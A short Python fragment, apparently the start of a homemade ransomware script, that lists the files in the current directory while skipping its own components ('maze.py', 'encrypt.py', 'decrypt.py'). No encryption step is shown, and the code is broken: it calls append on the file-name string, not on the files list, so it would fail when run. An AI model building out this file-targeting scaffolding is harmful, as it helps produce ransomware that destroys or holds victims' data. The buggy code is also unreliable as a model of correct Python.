import os

malware_files = ["maze.py", "encrypt.py", "decrypt.py"]
files = []

for file in os.listdir():
    if file in malware_files:
        continue

    # only files and no directories

    if os.path.isfile(file):
        file.append(file)   
